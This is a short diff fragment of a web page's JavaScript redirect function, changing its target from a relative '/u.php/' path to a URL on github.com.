@@ -7,7 +7,7 @@
 
 <script language="JavaScript" type="text/javascript">
 
-var pagina="/u.php/"
+var pagina="https://github.com/lobobreezy/atahrerwter/u.php/"
 function redireccionar() 
 {
 location.href=pagina
